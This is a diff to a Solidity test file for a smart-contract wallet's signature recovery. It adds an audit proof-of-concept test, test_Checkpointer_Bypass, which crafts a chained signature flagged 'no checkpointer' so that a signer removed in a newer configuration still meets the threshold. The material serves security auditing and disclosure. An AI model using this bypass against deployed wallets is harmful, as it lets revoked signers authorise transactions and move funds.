@@ -8,7 +8,7 @@ import { ICheckpointer, Snapshot } from "../../src/modules/interfaces/ICheckpoin
 import { ISapient, ISapientCompact } from "../../src/modules/interfaces/ISapient.sol";
 import { PrimitivesRPC } from "../utils/PrimitivesRPC.sol";
 import { AdvTest } from "../utils/TestUtils.sol";
-import { Vm } from "forge-std/Test.sol";
+import { Vm, console2 } from "forge-std/Test.sol";
 
 contract BaseSigImp {
 
@@ -1583,6 +1583,77 @@ contract BaseSigTest is AdvTest {
     assertEq(imageHash, vars.config1ImageHash); // Should recover to the first config in the chain
     assertEq(checkpoint, params.checkpoint1); // Should use checkpoint from the first config
     assertEq(opHash, Payload.hashFor(params.payload, address(baseSigImp)));
+  }
+
+  //@audit-poc
+  function test_Checkpointer_Bypass() external {
+    address checkpointerAddress = makeAddr("check pointer");
+
+    (address alice, uint256 aliceKey) = makeAddrAndKey("alice");
+    (address bob,) = makeAddrAndKey("bob");
+    Payload.Decoded memory payload;
+    uint256 checkpoint1 = 1;
+    uint16 threshold1 = 1;
+    uint256 checkpoint2 = 2;
+    uint16 threshold2 = 1;
+
+    // Let's assume config1 is currently where the wallet contract is at, while the checkpointer is ahead at config2
+    string memory config1 = PrimitivesRPC.newConfigWithCheckpointer(
+      vm, checkpointerAddress, threshold1, checkpoint1, string(abi.encodePacked("signer:", vm.toString(alice), ":1"))
+    );
+    // In config2 Alice is no longer a signer so she shouldn't be able to authorise any more transactions
+    string memory config2 = PrimitivesRPC.newConfigWithCheckpointer(
+      vm, checkpointerAddress, threshold2, checkpoint2, string(abi.encodePacked("signer:", vm.toString(bob), ":2"))
+    );
+    payload.kind = Payload.KIND_TRANSACTIONS;
+    payload.kind = Payload.KIND_TRANSACTIONS;
+    payload.calls = new Payload.Call[](1);
+    payload.calls[0] = Payload.Call({
+      to: address(0x123),
+      value: 0,
+      data: "",
+      gasLimit: 100000,
+      delegateCall: false,
+      onlyFallback: false,
+      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
+    });
+
+    Snapshot memory latestSnapshot = Snapshot(PrimitivesRPC.getImageHash(vm, config2), 2);
+
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(aliceKey, Payload.hashFor(payload, address(baseSigImp)));
+
+    string memory se =
+      string(abi.encodePacked(vm.toString(alice), ":hash:", vm.toString(r), ":", vm.toString(s), ":", vm.toString(v)));
+
+    bytes memory innerSignature = PrimitivesRPC.toEncodedSignature(vm, config1, se, true);
+
+    bytes memory maliciousSignature = abi.encodePacked(
+      bytes1(0x05), // Outer: chained + no checkpointer
+      bytes3(uint24(innerSignature.length)), // Length of inner signature
+      innerSignature // Signature that SHOULD require checkpointer but won't be validated
+    );
+
+    // Mock checkpointer to return latest state
+    vm.mockCall(
+      checkpointerAddress, abi.encodeWithSelector(ICheckpointer.snapshotFor.selector), abi.encode(latestSnapshot)
+    );
+
+    (uint256 threshold, uint256 weight, bytes32 imageHash, uint256 checkpoint,) =
+      baseSigImp.recoverPub(payload, maliciousSignature, true, address(0));
+
+    assertGe(weight, threshold, "Weight must at least reach threshold");
+  }
+
+  function computeImageHash(
+    bytes32 initialImageHash,
+    uint256 threshold,
+    uint256 checkpoint,
+    address checkpointer
+  ) internal pure returns (bytes32) {
+    bytes32 hash = keccak256(abi.encodePacked(initialImageHash, bytes32(threshold)));
+    hash = keccak256(abi.encodePacked(hash, bytes32(checkpoint)));
+    hash = keccak256(abi.encodePacked(hash, bytes32(uint256(uint160(checkpointer)))));
+    return hash;
   }
 
   struct test_checkpointer_migrate_from_snapshot_to_snapshot_params {
